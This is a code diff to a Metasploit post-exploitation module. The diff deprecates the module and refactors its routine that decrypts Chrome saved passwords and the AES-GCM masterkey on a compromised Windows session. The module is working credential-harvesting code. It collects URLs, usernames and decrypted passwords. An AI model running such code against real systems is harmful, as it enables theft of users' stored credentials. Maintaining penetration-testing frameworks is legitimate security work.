@@ -6,6 +6,9 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
+  include Msf::Exploit::Deprecated
+
+  deprecated nil, 'The post/windows/gather/enum_browsers module now supersedes this module'
 
   def initialize(info = {})
     super(
@@ -128,33 +131,31 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt_data(data)
-    memsize = 1024 * ((data.length + 1023) / 1024)
-    mem_alloc = session.railgun.kernel32.LocalAlloc(0, data.length)
-    mem = mem_alloc['return']
+    mem = session.railgun.kernel32.LocalAlloc(0, data.length)['return']
+    return nil if mem == 0
+
     session.railgun.memwrite(mem, data, data.length)
 
-    if session.arch == 'x86'
-      addr = [mem].pack('V')
-      len = [data.length].pack('V')
-      pdatain = "#{len}#{addr}".force_encoding('ascii')
-      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
-      len, addr = ret['pDataOut'].unpack('V2')
+    if session.arch == ARCH_X86
+      inout_fmt = 'V2'
+    elsif session.arch == ARCH_X64
+      inout_fmt = 'Q2'
     else
-      addr = [mem].pack('Q')
-      len = [data.length].pack('Q')
-      pdatain = "#{len}#{addr}".force_encoding('ascii')
-      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
-      len, addr = ret['pDataOut'].unpack('Q2')
+      fail_with(Failure::NoTarget, "Session architecture must be either x86 or x64.")
     end
 
-    return nil if len == 0
+    pdatain = [data.length, mem].pack(inout_fmt)
+    ret = session.railgun.crypt32.CryptUnprotectData(pdatain, nil, nil, nil, nil, 0, pdatain.length)
+    len, addr = ret['pDataOut'].unpack(inout_fmt)
 
-    decrypted = session.railgun.memread(addr, len)
+    decrypted = len == 0 ? nil : session.railgun.memread(addr, len)
 
-    session.railgun.kernel32.LocalFree(mem)
-    session.railgun.kernel32.LocalFree(addr)
+    multi_rail = []
+    multi_rail << ['kernel32', 'LocalFree', [mem]]
+    multi_rail << ['kernel32', 'LocalFree', [addr]] if addr != 0
+    session.railgun.multi(multi_rail)
 
-    return decrypted
+    decrypted
   end
 
   def process_files(username)
@@ -196,8 +197,8 @@ class MetasploitModule < Msf::Post
               print_status('Found password encrypted with masterkey')
               local_state_path = @profiles_path + '\\' + username + @data_path + 'Local State'
               masterkey_encrypted = get_master_key(local_state_path)
-              masterkey = decrypt_data(masterkey_encrypted[5..-1])
-              print_good('Found masterkey!')
+              masterkey = decrypt_data(masterkey_encrypted[5..])
+              print_good('Found masterkey!') if masterkey
             end
 
             cipher = OpenSSL::Cipher.new('aes-256-gcm')
@@ -205,12 +206,12 @@ class MetasploitModule < Msf::Post
             cipher.key = masterkey
             cipher.iv = enc_data[3..14]
             ciphertext = enc_data[15..-17]
-            cipher.auth_tag = enc_data[-16..-1]
+            cipher.auth_tag = enc_data[-16..]
             pass = res[field + '_decrypted'] = cipher.update(ciphertext) + cipher.final
           else
             pass = res[field + '_decrypted'] = decrypt_data(enc_data)
           end
-          next unless !pass.nil? and pass != ''
+          next unless !pass.nil? && (pass != '')
 
           decrypt_table << [name, pass, origin]
           secret = "url:#{origin} #{name}:#{pass}"
@@ -281,7 +282,7 @@ class MetasploitModule < Msf::Post
 
   def migrate(pid = nil)
     current_pid = session.sys.process.open.pid
-    if !pid.nil? and current_pid != pid
+    if !pid.nil? && (current_pid != pid)
       # PID is specified
       target_pid = pid
       print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
@@ -377,7 +378,7 @@ class MetasploitModule < Msf::Post
     usernames.each do |u|
       print_status("Extracting data for user '#{u}'...")
       success = extract_data(u)
-      process_files(u) if success and has_sqlite3
+      process_files(u) if success && has_sqlite3
     end
 
     # Migrate back to the original process
